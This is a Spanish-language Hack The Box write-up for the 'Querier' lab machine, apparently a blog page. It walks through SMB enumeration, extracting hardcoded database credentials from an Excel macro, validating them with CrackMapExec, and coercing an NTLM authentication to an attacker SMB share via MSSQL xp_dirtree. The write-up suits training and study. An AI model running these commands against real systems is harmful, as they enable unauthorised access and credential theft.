@@ -1,0 +1,1023 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Querier - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Querier en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Querier">
+<meta property="og:url" content="http://localhost:4000/htb-querier/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Querier en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-querier/querier.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-09-17T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-querier/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Querier</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Querier">
+    <meta itemprop="description" content="Resolución de la máquina Querier en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="September 17, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Querier
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-17T00:00:00-05:00">September 17, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-querier/banner-querier.jpg" alt="" /></p>
+
+<h2 id="querier">Querier</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.125.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.125
+PING 10.10.10.125 <span class="o">(</span>10.10.10.125<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.125: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>143 ms
+
+<span class="nt">---</span> 10.10.10.125 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 143.424/143.424/143.424/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.125 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-17 13:01 CDT
+Initiating SYN Stealth Scan at 13:01
+Scanning 10.10.10.125 <span class="o">[</span>65535 ports]
+Discovered open port 139/tcp on 10.10.10.125
+Discovered open port 445/tcp on 10.10.10.125
+Discovered open port 135/tcp on 10.10.10.125
+Discovered open port 49666/tcp on 10.10.10.125
+Discovered open port 49665/tcp on 10.10.10.125
+Discovered open port 49668/tcp on 10.10.10.125
+Discovered open port 49664/tcp on 10.10.10.125
+Discovered open port 49669/tcp on 10.10.10.125
+Discovered open port 49667/tcp on 10.10.10.125
+Discovered open port 47001/tcp on 10.10.10.125
+Discovered open port 5985/tcp on 10.10.10.125
+Discovered open port 1433/tcp on 10.10.10.125
+Discovered open port 49670/tcp on 10.10.10.125
+Discovered open port 49671/tcp on 10.10.10.125
+Completed SYN Stealth Scan at 13:02, 23.61s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.125
+Host is up, received user-set <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-09-17 13:01:43 CDT <span class="k">for </span>24s
+Not shown: 62465 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 3056 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+1433/tcp  open  ms-sql-s     syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+49670/tcp open  unknown      syn-ack ttl 127
+49671/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.92 seconds
+           Raw packets sent: 115468 <span class="o">(</span>5.081MB<span class="o">)</span> | Rcvd: 76061 <span class="o">(</span>3.043MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.125
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-17 13:03 CDT
+Nmap scan report <span class="k">for </span>10.10.10.125
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>    
+                                                                                                                                 
+PORT      STATE SERVICE       VERSION                                                                                            
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?                                                                                                    
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2021-09-17T18:00:36            
+|_Not valid after:  2051-09-17T18:00:36            
+| ms-sql-ntlm-info:                                             
+|   Target_Name: HTB                                            
+|   NetBIOS_Domain_Name: HTB                                    
+|   NetBIOS_Computer_Name: QUERIER                 
+|   DNS_Domain_Name: HTB.LOCAL                                  
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL           
+|   DNS_Tree_Name: HTB.LOCAL                                    
+|_  Product_Version: 10.0.17763
+|_ssl-date: 2021-09-17T18:09:27+00:00<span class="p">;</span> +4m45s from scanner time. 
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found                                         
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC    
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+                                
+Host script results:
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 1433
+|_clock-skew: mean: 4m44s, deviation: 0s, median: 4m43s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-09-17T18:09:22
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>68.70 seconds
+</code></pre></div></div>
+
+<p>Vamos a empezar con el análisis. Vemos el puerto 445 abierto, por lo que podríamos intentar conectarnos haciendo uso de una <em>null session</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.125 <span class="nt">-N</span>
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+        C<span class="nv">$ </span>             Disk      Default share
+        IPC<span class="nv">$ </span>           IPC       Remote IPC
+        Reports         Disk      
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<p>En el resultado, podemos ver un recurso denominado <code class="language-plaintext highlighter-rouge">Reports</code>, por lo que ahora nos conectaremos haciendo uso de <code class="language-plaintext highlighter-rouge">smbclient</code> con una <em>null session</em> para ver si el directorio tiene contenido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.125/Reports <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Mon Jan 28 17:23:48 2019
+  ..                                  D        0  Mon Jan 28 17:23:48 2019
+  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019
+
+                6469119 blocks of size 4096. 1614769 blocks available
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>Observamos el archivo <em>Currency Volume Report.xlsm</em>, por lo que lo traemos a nuestra máquina de atacante para ver su contenido.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get <span class="s2">"Currency Volume Report.xlsm"</span>
+getting file <span class="se">\C</span>urrency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm <span class="o">(</span>16.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 16.4 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>Para efectos prácticos, renombramos el archivo a <em>document.xlsm</em>. Obtenemos datos del documento antes de abrirlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ file document.xlsm
+document.xlsm: Microsoft Excel 2007+
+❯ exiftool document.xlsm
+ExifTool Version Number         : 12.16
+File Name                       : document.xlsm
+Directory                       : <span class="nb">.</span>
+File Size                       : 12 KiB
+File Modification Date/Time     : 2021:09:17 13:27:24-05:00
+File Access Date/Time           : 2021:09:17 13:27:24-05:00
+File Inode Change Date/Time     : 2021:09:17 13:28:04-05:00
+File Permissions                : rw-r--r--
+File Type                       : XLSM
+File Type Extension             : xlsm
+MIME Type                       : application/vnd.ms-excel.sheet.macroEnabled
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0006
+Zip Compression                 : Deflated
+Zip Modify Date                 : 1980:01:01 00:00:00
+Zip CRC                         : 0x513599ac
+Zip Compressed Size             : 367
+Zip Uncompressed Size           : 1087
+Zip File Name                   : <span class="o">[</span>Content_Types].xml
+Creator                         : Luis
+Last Modified By                : Luis
+Create Date                     : 2019:01:21 20:38:56Z
+Modify Date                     : 2019:01:27 22:21:34Z
+Application                     : Microsoft Excel
+Doc Security                    : None
+Scale Crop                      : No
+Heading Pairs                   : Worksheets, 1
+Titles Of Parts                 : Currency Volume
+Company                         : 
+Links Up To Date                : No
+Shared Doc                      : No
+Hyperlinks Changed              : No
+App Version                     : 16.0300
+</code></pre></div></div>
+
+<p>Vemos que se trata de un archivo de <strong>Microsoft Excel 2007</strong> creado por el usuario <strong>Luis</strong> y que el valor de <strong>MIME Type</strong> es <code class="language-plaintext highlighter-rouge">application/vnd.ms-excel.sheet.macroEnabled</code>, lo que nos indica que el archivo presenta una macro (también lo podriamos ver por la extensión del archivo). Para la visualización del contenido, podríamos utilizar <em>Open Office</em>; pero para no pelearnos con temas de proporciones o cosas random, nos instalaremos <a href="https://linux.wps.com/">WPS Office</a>.</p>
+
+<p><img src="/assets/images/htb-querier/querier_document.jpg" alt="" /></p>
+
+<p>Vemos que no presenta contenido el archivo; sin embargo, sabemos que presenta una macro, la cual podríamos tratar de visualizarla con <strong>WPS Office</strong>. Para este caso, vamos a utilizar la siguiente herramienta:</p>
+
+<ul>
+  <li><a href="https://github.com/decalage2/oletools">Oletools</a></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/decalage2/oletools
+Clonando en <span class="s1">'oletools'</span>...
+remote: Enumerating objects: 6356, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>239/239<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>169/169<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 6356 <span class="o">(</span>delta 156<span class="o">)</span>, reused 139 <span class="o">(</span>delta 70<span class="o">)</span>, pack-reused 6117
+Recibiendo objetos: 100% <span class="o">(</span>6356/6356<span class="o">)</span>, 4.80 MiB | 5.28 MiB/s, listo.
+Resolviendo deltas: 100% <span class="o">(</span>4365/4365<span class="o">)</span>, listo.
+</code></pre></div></div>
+
+<p>Ingresamos al directorio e instalamos con el siguienten comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 setup.py <span class="nb">install</span>
+</code></pre></div></div>
+
+<p>Ahora ejecutamos el siguiente comando pasandole como parámetro el nombre del archivo que queremos visualizar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ olevba document.xlsm                                          
+olevba 0.60 on Python 3.9.2 - http://decalage.info/python/oletools
+<span class="o">===============================================================================</span>
+FILE: document.xlsm
+Type: OpenXML        
+WARNING  For now, VBA stomping cannot be detected <span class="k">for </span>files <span class="k">in </span>memory
+<span class="nt">-------------------------------------------------------------------------------</span>
+VBA MACRO ThisWorkbook.cls 
+<span class="k">in </span>file: xl/vbaProject.bin - OLE stream: <span class="s1">'VBA/ThisWorkbook'</span>
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+                                                                                                                                 <span class="s1">' macro to pull data for client volume reports
+'</span>                          
+<span class="s1">' further testing required
+
+Private Sub Connect()           
+
+Dim conn As ADODB.Connection                                    
+Dim rs As ADODB.Recordset
+                                                                
+Set conn = New ADODB.Connection                                 
+conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc
+$c6"      
+conn.ConnectionTimeout = 10
+conn.Open
+
+If conn.State = adStateOpen Then
+                                                                                                                                 
+  '</span> MsgBox <span class="s2">"connection successful"</span>
+                                                                
+  <span class="s1">'Set rs = conn.Execute("SELECT * @@version;")                                                                                  
+  Set rs = conn.Execute("SELECT * FROM volume;")
+  Sheets(1).Range("A1").CopyFromRecordset rs                                                                                     
+  rs.Close                                                                                                                       
+                                                                                                                                 
+End If                                                                                                                           
+                                                                                                                                 
+End Sub                                                                                                                          
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls                                                                                                             
+in file: xl/vbaProject.bin - OLE stream: '</span>VBA/Sheet1<span class="s1">'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+</span></code></pre></div></div>
+
+<p>En la información reportada, vemos que la macro establece una conexión con una base de datos, por lo que nos guardamos las credenciales de acceso. Para validar si las credenciales son válidas, podemos intentar establecer una conexión por <em>smb</em> a través de la utilidad <a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation">CrackMapExec</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.125 <span class="nt">-u</span> <span class="s1">'reporting'</span> <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>-] HTB.LOCAL<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span> STATUS_NO_LOGON_SERVERS 
+</code></pre></div></div>
+
+<p>Vemos que nos reporta un <strong>[-]</strong>, pero lo maneja como dominio de <strong>HTB.LOCAL</strong>, vamos a probar si el usario existe pero a nivel del sistema y no de dominio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.125 <span class="nt">-u</span> <span class="s1">'reporting'</span> <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">-d</span> WORKGROUP
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
+</code></pre></div></div>
+
+<p>Ahora si vemos un <strong>[+]</strong>, lo que significa que el usuario existe a nivel de sistema. Una vez que validamos las credenciales, podemos conectarnos al servicio de <em>Microsoft SQL Server</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mssqlclient.py WORKGROUP/reporting@10.10.10.125 <span class="nt">-windows-auth</span>
+/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="k">for </span>it is now deprecated <span class="k">in </span>cryptography, and will be removed <span class="k">in </span>the next release.
+  from cryptography import utils, x509
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: None, New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'volume'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt;
+</code></pre></div></div>
+
+<p>Vamos a probar si podemos ejecutar algunos comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell <span class="s2">"whoami"</span>
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: The EXECUTE permission was denied on the object <span class="s1">'xp_cmdshell'</span>, database <span class="s1">'mssqlsystemresource'</span>, schema <span class="s1">'sys'</span><span class="nb">.</span>
+SQL&gt; sp_configure <span class="s2">"show advanced"</span>, 1
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 105: User does not have permission to perform this action.
+SQL&gt;
+</code></pre></div></div>
+
+<p>Vemos que no podemos ejecutar comandos a nivel de sistema ni tampoco tenemos privilegios para alterar la configuración que nos pueda permitir habilitar la ejecución de comandos. Por lo tanto, lo que nos queda sería tratar de acceder a un recurso compartido por red mediante el uso del comando <code class="language-plaintext highlighter-rouge">xp_dirtree</code>. Asi que, nos compartimos un recurso desde nuestra máquina de atacante:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_dirtree <span class="s2">"</span><span class="se">\\</span><span class="s2">10.10.14.2</span><span class="se">\s</span><span class="s2">mbFolder</span><span class="se">\t</span><span class="s2">est"</span>
+subdirectory                                                                                                                                                                                                                                                            depth   
+
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span>   <span class="nt">-----------</span>   
+
+SQL&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.125,49694<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc,QUERIER<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\m</span>ssql-svc authenticated successfully
